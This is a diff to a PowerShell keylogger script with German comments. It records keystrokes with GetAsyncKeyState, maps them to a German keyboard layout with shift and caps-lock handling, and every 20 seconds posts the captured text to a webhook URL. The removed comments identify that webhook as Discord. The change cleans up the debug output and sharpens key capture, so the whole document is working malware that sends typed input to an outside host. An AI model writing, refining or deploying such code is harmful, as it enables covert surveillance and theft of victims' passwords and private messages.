@@ -21,97 +21,60 @@ try {
     Invoke-RestMethod -Uri $hookUrl -Method Post -Body (@{content="[Logger] gestartet: $(Get-Date -Format o)"}|ConvertTo-Json) -ContentType "application/json"
 } catch {}
 
+function Get-KeyChar {
+    param($char)
+    $shift = ([Keyboard]::GetAsyncKeyState(16) -ne 0) # Shift-Key
+    $caps = ([Keyboard]::GetAsyncKeyState(20) -ne 0) # CapsLock
+    if ($char -ge 65 -and $char -le 90) { # A-Z
+        if ($shift -xor $caps) {
+            return [char]$char
+        } else {
+            return ([char]($char + 32)) # a-z
+        }
+    } elseif ($char -ge 48 -and $char -le 57) { # 0-9
+        if ($shift) {
+            $shiftNums = @(')','!','"','#','$','%','&','/','(','=')
+            return $shiftNums[$char-48]
+        } else {
+            return [char]$char
+        }
+    } else {
+        # Standardzeichen, rudimentär für DE-Layout
+        $deSpec = @{44=';';46=',';45='-';47='#';59='ö';91='ü';93='ä';92='ß'}
+        if ($deSpec.ContainsKey($char)) {
+            return $deSpec[$char]
+        } else {
+            return [char]$char
+        }
+    }
+}
+
 while ($true) {
-    # Laufzeit prüfen
     $elapsed = (Get-Date) - $start
     if ($elapsed.TotalSeconds -ge $timeout) {
         break
     }
-    # 1. Tastatureingaben aufzeichnen
-
-
     foreach ($char in 32..126) {
-
         if ([Keyboard]::GetAsyncKeyState($char) -eq -32767) {
-
-            Add-Content -Path $logFile -Value ([char]$char)
-
-
-            $debugLogContent += "`n[DEBUG] Taste erkannt: $([char]$char) - $(Get-Date -Format o)"
-
+            $key = Get-KeyChar $char
+            Add-Content -Path $logFile -Value $key
         }
-
     }
-
-
-    # 2. Alle X Sekunden Log und Debug an Discord schicken
-
-    if ((Get-Date).Second % 20 -eq 0) {  # Alle 20 Sekunden
-
-
-        $discordMsg = ""
-
+    if ((Get-Date).Second % 20 -eq 0) {
         if (Test-Path $logFile) {
-
             $keylog = Get-Content $logFile -Raw
-
             if ($keylog.Trim().Length -gt 0) {
-
-
-                $discordMsg += "[Keylog]`n$keylog`n"
-
-
-                $debugLogContent += "`n[INFO] Keylog an Discord gesendet: $(Get-Date -Format o)"
-
-                Clear-Content $logFile  # Nach dem Senden leeren
-
+                try {
+                    Invoke-RestMethod -Uri $hookUrl -Method Post -Body (@{content=$keylog}|ConvertTo-Json) -ContentType "application/json"
+                } catch {}
+                Clear-Content $logFile
             }
-
         }
-
-
-        if ($debugLogContent.Trim().Length -gt 0) {
-
-
-            $discordMsg += "[Debug]`n$debugLogContent"
-
-
-            $debugLogContent = ""  # Nach dem Senden leeren
-
-
-        }
-
-
-        if ($discordMsg.Trim().Length -gt 0) {
-
-
-            try {
-
-
-                Invoke-RestMethod -Uri $hookUrl -Method Post -Body (@{content=$discordMsg}|ConvertTo-Json) -ContentType "application/json"
-
-
-            } catch {
-
-
-                $debugLogContent += "`n[ERROR] Fehler beim Senden an Discord: $_ - $(Get-Date -Format o)"
-
-
-            }
-
-
-        }
-
         Start-Sleep -Seconds 1
-
     } else {
-
         Start-Sleep -Milliseconds 40
-
     }
-
 }
-# Nach Timeout evtl. noch ein letztes Mal den Log senden
 if (Test-Path $logFile) {
     $keylog = Get-Content $logFile -Raw
     if ($keylog.Trim().Length -gt 0) {
@@ -121,7 +84,6 @@ if (Test-Path $logFile) {
         Clear-Content $logFile
     }
 }
-# Logger-Ende an Discord melden
 try {
     Invoke-RestMethod -Uri $hookUrl -Method Post -Body (@{content="[Logger] beendet: $(Get-Date -Format o)"}|ConvertTo-Json) -ContentType "application/json"
 } catch {}
